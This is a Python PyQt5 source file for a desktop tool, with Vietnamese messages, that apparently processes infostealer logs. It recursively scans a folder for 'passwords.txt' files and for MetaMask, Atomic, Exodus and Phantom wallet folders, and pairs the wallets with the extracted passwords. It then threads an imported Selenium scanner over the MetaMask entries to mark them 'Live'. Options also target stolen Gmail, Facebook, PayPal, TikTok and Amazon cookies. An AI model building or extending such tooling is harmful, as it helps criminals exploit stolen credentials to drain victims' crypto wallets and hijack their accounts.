from PyQt5 import QtCore, QtWidgets
from ScannerWalletSelenium import ScannerWalletSelenium
import os, time
import pathlib
class BotScannerToolWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(1072, 777)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.groupBox = QtWidgets.QGroupBox(self.centralwidget)
        self.groupBox.setGeometry(QtCore.QRect(10, 10, 281, 201))
        self.groupBox.setObjectName("groupBox")
        self.thread_label = QtWidgets.QLabel(self.groupBox)
        self.thread_label.setGeometry(QtCore.QRect(20, 20, 47, 13))
        self.thread_label.setObjectName("thread_label")
        self.thread_input = QtWidgets.QSpinBox(self.groupBox)
        self.thread_input.setGeometry(QtCore.QRect(64, 14, 42, 22))
        self.thread_input.setProperty("value", 1)
        self.thread_input.setObjectName("thread_input")
        self.LD_link = QtWidgets.QLineEdit(self.groupBox)
        self.LD_link.setGeometry(QtCore.QRect(53, 50, 161, 20))
        self.LD_link.setObjectName("LD_link")
        self.delayLD_label = QtWidgets.QLabel(self.groupBox)
        self.delayLD_label.setGeometry(QtCore.QRect(140, 20, 47, 13))
        self.delayLD_label.setObjectName("delayLD_label")
        self.delayLD_input = QtWidgets.QSpinBox(self.groupBox)
        self.delayLD_input.setGeometry(QtCore.QRect(190, 14, 42, 22))
        self.delayLD_input.setProperty("value", 1)
        self.delayLD_input.setObjectName("delayLD_input")
        self.btn_LD_link = QtWidgets.QToolButton(self.groupBox)
        self.btn_LD_link.setGeometry(QtCore.QRect(225, 50, 31, 21))
        self.btn_LD_link.setObjectName("btn_LD_link")
        self.thread_label_2 = QtWidgets.QLabel(self.groupBox)
        self.thread_label_2.setGeometry(QtCore.QRect(20, 50, 31, 16))
        self.thread_label_2.setObjectName("thread_label_2")
        self.groupBox_3 = QtWidgets.QGroupBox(self.groupBox)
        self.groupBox_3.setGeometry(QtCore.QRect(19, 80, 241, 101))
        self.groupBox_3.setObjectName("groupBox_3")
        self.comboBox = QtWidgets.QComboBox(self.groupBox_3)
        self.comboBox.setGeometry(QtCore.QRect(10, 20, 221, 22))
        self.comboBox.setObjectName("comboBox")
        self.comboBox.addItem("")
        self.comboBox.addItem("")
        self.comboBox.addItem("")
        self.plainTextEdit = QtWidgets.QPlainTextEdit(self.groupBox_3)
        self.plainTextEdit.setGeometry(QtCore.QRect(10, 50, 221, 41))
        self.plainTextEdit.setObjectName("plainTextEdit")
        self.btn_start = QtWidgets.QPushButton(self.centralwidget)
        self.btn_start.setGeometry(QtCore.QRect(10, 215, 51, 31))
        self.btn_start.setObjectName("btn_start")
        self.groupBox_2 = QtWidgets.QGroupBox(self.centralwidget)
        self.groupBox_2.setEnabled(True)
        self.groupBox_2.setGeometry(QtCore.QRect(300, 10, 751, 201))
        self.groupBox_2.setInputMethodHints(QtCore.Qt.ImhNone)
        self.groupBox_2.setObjectName("groupBox_2")
        self.tab_cookies = QtWidgets.QTabWidget(self.groupBox_2)
        self.tab_cookies.setGeometry(QtCore.QRect(10, 20, 731, 171))
        self.tab_cookies.setObjectName("tab_cookies")
        self.tab_wallets = QtWidgets.QWidget()
        self.tab_wallets.setObjectName("tab_wallets")
        self.cb_metamask = QtWidgets.QCheckBox(self.tab_wallets)
        self.cb_metamask.setGeometry(QtCore.QRect(20, 20, 70, 17))
        self.cb_metamask.setObjectName("cb_metamask")
        self.cb_exodus = QtWidgets.QCheckBox(self.tab_wallets)
        self.cb_exodus.setGeometry(QtCore.QRect(20, 50, 70, 17))
        self.cb_exodus.setObjectName("cb_exodus")
        self.cb_atomic = QtWidgets.QCheckBox(self.tab_wallets)
        self.cb_atomic.setGeometry(QtCore.QRect(140, 20, 91, 17))
        self.cb_atomic.setObjectName("cb_atomic")
        self.cb_phantom = QtWidgets.QCheckBox(self.tab_wallets)
        self.cb_phantom.setGeometry(QtCore.QRect(140, 50, 101, 17))
        self.cb_phantom.setObjectName("cb_phantom")
        self.tab_cookies.addTab(self.tab_wallets, "")
        self.tab_download = QtWidgets.QWidget()
        self.tab_download.setObjectName("tab_download")
        self.cb_gmail = QtWidgets.QCheckBox(self.tab_download)
        self.cb_gmail.setGeometry(QtCore.QRect(20, 50, 70, 17))
        self.cb_gmail.setObjectName("cb_gmail")
        self.cb_facebook = QtWidgets.QCheckBox(self.tab_download)
        self.cb_facebook.setGeometry(QtCore.QRect(20, 20, 70, 17))
        self.cb_facebook.setObjectName("cb_facebook")
        self.cb_paypal = QtWidgets.QCheckBox(self.tab_download)
        self.cb_paypal.setGeometry(QtCore.QRect(140, 50, 101, 17))
        self.cb_paypal.setObjectName("cb_paypal")
        self.cb_tiktok = QtWidgets.QCheckBox(self.tab_download)
        self.cb_tiktok.setGeometry(QtCore.QRect(140, 20, 91, 17))
        self.cb_tiktok.setObjectName("cb_tiktok")
        self.cb_freebitcoin = QtWidgets.QCheckBox(self.tab_download)
        self.cb_freebitcoin.setGeometry(QtCore.QRect(260, 50, 101, 17))
        self.cb_freebitcoin.setObjectName("cb_freebitcoin")
        self.cb_amazon = QtWidgets.QCheckBox(self.tab_download)
        self.cb_amazon.setGeometry(QtCore.QRect(260, 20, 91, 17))
        self.cb_amazon.setObjectName("cb_amazon")
        self.tab_cookies.addTab(self.tab_download, "")
        self.tab_data = QtWidgets.QTabWidget(self.centralwidget)
        self.tab_data.setGeometry(QtCore.QRect(10, 250, 1051, 491))
        self.tab_data.setObjectName("tab_data")
        self.tab_1 = QtWidgets.QWidget()
        self.tab_1.setObjectName("tab_1")
        self.table_wallets = QtWidgets.QTableWidget(self.tab_1)
        self.table_wallets.setGeometry(QtCore.QRect(10, 10, 1021, 441))
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Minimum, QtWidgets.QSizePolicy.Minimum)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.table_wallets.sizePolicy().hasHeightForWidth())
        self.table_wallets.setSizePolicy(sizePolicy)
        self.table_wallets.setMinimumSize(QtCore.QSize(0, 1))
        self.table_wallets.setMaximumSize(QtCore.QSize(1021, 16777215))
        self.table_wallets.setMouseTracking(False)
        self.table_wallets.setTabletTracking(False)
        self.table_wallets.setContextMenuPolicy(QtCore.Qt.DefaultContextMenu)
        self.table_wallets.setLineWidth(1)
        self.table_wallets.setAutoScrollMargin(16)
        self.table_wallets.setDragEnabled(False)
        self.table_wallets.setSelectionMode(QtWidgets.QAbstractItemView.SingleSelection)
        self.table_wallets.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectRows)
        self.table_wallets.setShowGrid(True)
        self.table_wallets.setObjectName("table_wallets")
        self.table_wallets.setColumnCount(5)
        self.table_wallets.setRowCount(0)
        item = QtWidgets.QTableWidgetItem()
        self.table_wallets.setHorizontalHeaderItem(0, item)
        item = QtWidgets.QTableWidgetItem()
        self.table_wallets.setHorizontalHeaderItem(1, item)
        item = QtWidgets.QTableWidgetItem()
        self.table_wallets.setHorizontalHeaderItem(2, item)
        item = QtWidgets.QTableWidgetItem()
        self.table_wallets.setHorizontalHeaderItem(3, item)
        item = QtWidgets.QTableWidgetItem()
        self.table_wallets.setHorizontalHeaderItem(4, item)
        self.table_wallets.horizontalHeader().setDefaultSectionSize(250)
        self.table_wallets.verticalHeader().setStretchLastSection(True)
        self.tab_data.addTab(self.tab_1, "")
        self.tab_2 = QtWidgets.QWidget()
        self.tab_2.setObjectName("tab_2")
        self.table_cookies = QtWidgets.QTableWidget(self.tab_2)
        self.table_cookies.setGeometry(QtCore.QRect(10, 10, 1021, 461))
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Minimum, QtWidgets.QSizePolicy.Minimum)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.table_cookies.sizePolicy().hasHeightForWidth())
        self.table_cookies.setSizePolicy(sizePolicy)
        self.table_cookies.setMinimumSize(QtCore.QSize(0, 1))
        self.table_cookies.setMaximumSize(QtCore.QSize(1021, 16777215))
        self.table_cookies.setMouseTracking(False)
        self.table_cookies.setTabletTracking(False)
        self.table_cookies.setContextMenuPolicy(QtCore.Qt.DefaultContextMenu)
        self.table_cookies.setLineWidth(1)
        self.table_cookies.setAutoScrollMargin(16)
        self.table_cookies.setDragEnabled(False)
        self.table_cookies.setSelectionMode(QtWidgets.QAbstractItemView.SingleSelection)
        self.table_cookies.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectRows)
        self.table_cookies.setShowGrid(True)
        self.table_cookies.setObjectName("table_cookies")
        self.table_cookies.setColumnCount(4)
        self.table_cookies.setRowCount(0)
        item = QtWidgets.QTableWidgetItem()
        self.table_cookies.setHorizontalHeaderItem(0, item)
        item = QtWidgets.QTableWidgetItem()
        self.table_cookies.setHorizontalHeaderItem(1, item)
        item = QtWidgets.QTableWidgetItem()
        self.table_cookies.setHorizontalHeaderItem(2, item)
        item = QtWidgets.QTableWidgetItem()
        self.table_cookies.setHorizontalHeaderItem(3, item)
        self.table_cookies.horizontalHeader().setDefaultSectionSize(250)
        self.table_cookies.verticalHeader().setStretchLastSection(True)
        self.tab_data.addTab(self.tab_2, "")
        self.btn_pause = QtWidgets.QPushButton(self.centralwidget)
        self.btn_pause.setGeometry(QtCore.QRect(71, 215, 51, 31))
        self.btn_pause.setObjectName("btn_pause")
        self.btn_start_2 = QtWidgets.QPushButton(self.centralwidget)
        self.btn_start_2.setGeometry(QtCore.QRect(133, 215, 51, 31))
        self.btn_start_2.setObjectName("btn_start_2")
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 1072, 21))
        self.menubar.setObjectName("menubar")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)
        self.tab_cookies.setCurrentIndex(0)
        self.tab_data.setCurrentIndex(0)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.groupBox.setTitle(_translate("MainWindow", "Settings"))
        self.thread_label.setText(_translate("MainWindow", "Thread:"))
        self.LD_link.setText(_translate("MainWindow", "E:\\QUYNV\\MMO\\LogsDiller Cloud_Free_573_#108"))
        self.delayLD_label.setText(_translate("MainWindow", "DelayLD:"))
        self.btn_LD_link.setText(_translate("MainWindow", "..."))
        self.thread_label_2.setText(_translate("MainWindow", "Path:"))
        self.groupBox_3.setTitle(_translate("MainWindow", "Proxy"))
        self.comboBox.setItemText(0, _translate("MainWindow", "No Proxy"))
        self.comboBox.setItemText(1, _translate("MainWindow", "TMP Proxy"))
        self.comboBox.setItemText(2, _translate("MainWindow", "Tinsoft"))
        self.btn_start.setText(_translate("MainWindow", "Start"))
        self.groupBox_2.setTitle(_translate("MainWindow", "Options"))
        self.cb_metamask.setText(_translate("MainWindow", "MetaMask"))
        self.cb_exodus.setText(_translate("MainWindow", "Exodus"))
        self.cb_atomic.setText(_translate("MainWindow", "Atomic Wallet"))
        self.cb_phantom.setText(_translate("MainWindow", "Phantom wallet"))
        self.tab_cookies.setTabText(self.tab_cookies.indexOf(self.tab_wallets), _translate("MainWindow", "Wallets"))
        self.cb_gmail.setText(_translate("MainWindow", "Gmail"))
        self.cb_facebook.setText(_translate("MainWindow", "Facebook"))
        self.cb_paypal.setText(_translate("MainWindow", "Paypal"))
        self.cb_tiktok.setText(_translate("MainWindow", "Tiktok"))
        self.cb_freebitcoin.setText(_translate("MainWindow", "Freebitco.in"))
        self.cb_amazon.setText(_translate("MainWindow", "Amazon"))
        self.tab_cookies.setTabText(self.tab_cookies.indexOf(self.tab_download), _translate("MainWindow", "Cookies"))
        item = self.table_wallets.horizontalHeaderItem(0)
        item.setText(_translate("MainWindow", "Path"))
        item = self.table_wallets.horizontalHeaderItem(1)
        item.setText(_translate("MainWindow", "Wallet"))
        item = self.table_wallets.horizontalHeaderItem(2)
        item.setText(_translate("MainWindow", "Password"))
        item = self.table_wallets.horizontalHeaderItem(3)
        item.setText(_translate("MainWindow", "Live"))
        item = self.table_wallets.horizontalHeaderItem(4)
        item.setText(_translate("MainWindow", "Status"))
        self.tab_data.setTabText(self.tab_data.indexOf(self.tab_1), _translate("MainWindow", "List Wallets"))
        item = self.table_cookies.horizontalHeaderItem(0)
        item.setText(_translate("MainWindow", "Domain"))
        item = self.table_cookies.horizontalHeaderItem(1)
        item.setText(_translate("MainWindow", "Cookies"))
        item = self.table_cookies.horizontalHeaderItem(2)
        item.setText(_translate("MainWindow", "Live"))
        item = self.table_cookies.horizontalHeaderItem(3)
        item.setText(_translate("MainWindow", "Status"))
        self.tab_data.setTabText(self.tab_data.indexOf(self.tab_2), _translate("MainWindow", "List cokkies"))
        self.btn_pause.setText(_translate("MainWindow", "Pause"))
        self.btn_start_2.setText(_translate("MainWindow", "Check"))
        self.indexsuccess = 0
        self.indexerror = 0
        self.listthread = []
        self.listAccountRunning = []
        self.list_hostmail = []
        self.list_wallets = []
        self.runCount = 0
        self.index = 0
        self.btn_start.clicked.connect(self.StartReg)
        self.btn_start_2.clicked.connect(self.CheckFolder)
        self.btn_LD_link.clicked.connect(self.FileDialogLD)

    def CheckFolder(self):
        if len(self.LD_link.text()) == 0 or not os.path.exists(self.LD_link.text()):
           self.Mesagebox(text="Chọn folder !")
           return
        rootPath = pathlib.Path(self.LD_link.text())
        self.recursiveDir(rootPath)
        self.table_wallets.setRowCount(0)
        i = 0
        if len(self.list_wallets) > 0:
            for account in self.list_wallets:
                self.table_wallets.insertRow(i)
                self.ShowTable(i, 0, account["path"])
                self.ShowTable(i, 1, account["wallet"])
                self.ShowTable(i, 2, account["password"])
                self.ShowTable(i, 3, account["live"])
                self.ShowTable(i, 4, account["status"])
                i += 1 
        else:
            self.Mesagebox(text="Không tìm thấy dữ liệu")

    def recursiveDir(self, path: pathlib.Path, passwordRoot = None):
        password = None
        for item in path.iterdir():
            if passwordRoot is None and item.is_file() and "passwords.txt" in str(item).lower():
                if os.path.exists(item):
                    passwordReadFile = open(f"{item}", 'r')
                    if passwordReadFile:
                        try:
                            list_password = passwordReadFile.read().splitlines()
                            for pwdstr in list_password:
                                try:
                                    if pwdstr is not None and len(str(pwdstr)) > 0 and 'Password:' in str(pwdstr):
                                        if password is None or len(password) == 0:
                                            password = str(pwdstr).replace("Password:", "").replace(" ", "")
                                        else:
                                            password = f"{password}|{str(pwdstr).replace('Password:', '').replace(' ', '')}"
                                except:
                                    continue
                        except:
                            continue
            if item.is_dir():
                isMetamask = 'metamask' in str(item).lower()
                isAtomic = 'atomic' in str(item).lower()
                isExodus = 'exodus' in str(item).lower()
                isPhantom = 'phantom' in str(item).lower()            
                if isMetamask == False and isAtomic == False and isExodus == False and isPhantom == False:
                    self.recursiveDir(item, password if password is not None else passwordRoot)
                else:
                    obj = { "path": str(item), "wallet": "MetaMask" if isMetamask == True  else "Atomic" if isAtomic == True else "Exodus" if isExodus == True else "Phantom",
                           "password": passwordRoot, "live": None, "status": None}
                    self.list_wallets.append(obj)

    def FileDialogLD(self):
        self.filepath2 = QtWidgets.QFileDialog()
        self.filepath2.setFileMode(QtWidgets.QFileDialog.Directory)
        self.filepath2.show()
        if self.filepath2.exec_() == QtWidgets.QDialog.Accepted: 
            folder = self.filepath2.selectedFiles()[0]
            self.LD_link.setText(folder)

    def Mesagebox(self, title="Thông báo", text=""):
        self.msg = QtWidgets.QMessageBox()
        self.msg.setIcon(QtWidgets.QMessageBox.Warning)
        self.msg.setWindowTitle(title)
        self.msg.setText(text)
        self.msg.show()

    
    def listenEvent(self, event_bus):
        # event_bus.subscribe("updateData", self.updateTokenData)
        # event_bus.subscribe("newToken", self.newToken)
        # thread = threading.Thread(target=self.monitor_jobs)
        # thread.start()
        print("dzo listen")
        
    def LDViewer(self):
        from Viewer import Ui_LDPlayerViewer
        global LDPlayerViewer
        LDPlayerViewer = QtWidgets.QWidget()
        self.view = Ui_LDPlayerViewer()
        self.view.setupUi(LDPlayerViewer)
        LDPlayerViewer.show()
        
    def Delay(self, countdelay):
        loop = QtCore.QEventLoop()
        QtCore.QTimer.singleShot(int(countdelay*1000), loop.quit)
        loop.exec()

    def ShowTable(self, row, column, text):
        self.table_wallets.setItem(row, column, QtWidgets.QTableWidgetItem(text))
        
    def ChangeTextSuccessAndError(self, check, row, status):
        time.sleep(5)
        # if check:
        #     self.success.setText(f"<p><span style=\" color:#00aa00;\">Success: {self.indexsuccess}</span></p>")
        # else:
        #     self.error.setText(f"<p><span style=\" color:#ff0000;\">Error: {self.indexerror}</span></p>")
        self.ShowTable(row, 3, True)
        self.ShowTable(row, 4, status)
        self.runCount -= 1
        self.StartReg()
            
    def StartReg(self):
        if self.btn_start.text() == "Start":
            print('self.index', self.index)
            if self.list_wallets is None or len(self.list_wallets) == 0:
                self.Mesagebox(text="Không có dữ liệu để thực hiện !")
                return
            if len(self.list_wallets) > self.index:
                for vm in self.list_wallets:
                    print(vm["path"], vm["wallet"])
                    if self.runCount < int(self.thread_input.text())  and len(self.list_wallets) > self.index and vm["wallet"] == "MetaMask":
                        wallet = self.list_wallets[self.index]
                        self.threadreg = StartQ(self, self.index, wallet)
                        self.threadreg.show.connect(self.ShowTable)
                        self.threadreg.checksuccess.connect(self.ChangeTextSuccessAndError)
                        self.listthread.append(self.threadreg)
                        self.threadreg.start()
                        self.runCount += 1
                        time.sleep(1)
                    self.index += 1
        else:
            for thread in self.listthread: thread.Stop()
            self.btn_start.setText('Start')


class StartQ(QtCore.QThread):
    delete = QtCore.pyqtSignal()
    show = QtCore.pyqtSignal(int, int, str)
    checksuccess = QtCore.pyqtSignal(bool, int, str)
    def __init__(self, ref, index, wallet) -> None:
        super().__init__()
        self.ref = ref
        self.index = index
        self.wallet = wallet

    def run(self):
        self.reg = ScannerWalletSelenium(self.index, self.wallet)
        self.reg.ref = self
        self.reg.run()
        time.sleep(0.2)
